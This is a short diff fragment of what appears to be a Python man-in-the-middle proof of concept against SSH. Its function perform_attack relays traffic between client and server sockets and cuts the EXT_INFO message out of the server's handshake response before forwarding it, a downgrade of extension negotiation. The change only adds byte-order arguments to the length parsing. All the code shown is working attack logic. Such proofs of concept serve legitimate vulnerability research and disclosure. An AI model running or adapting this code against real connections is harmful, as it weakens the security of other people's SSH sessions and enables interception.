@@ -63,9 +63,9 @@ def perform_attack(client_socket, server_socket):
     server_response = server_socket.recv(35000)
     # Strip EXT_INFO before forwarding server_response to client
     # Length fields of KEX_REPLY and NEW_KEYS are still unencrypted
-    server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[:LENGTH_FIELD_LENGTH])
+    server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[:LENGTH_FIELD_LENGTH], byteorder='big')
     server_newkeys_start = server_kex_reply_length
-    server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + LENGTH_FIELD_LENGTH])
+    server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + LENGTH_FIELD_LENGTH], byteorder='big')
     server_extinfo_start = server_newkeys_start + server_newkeys_length
     client_socket.send(server_response[:server_extinfo_start])
 
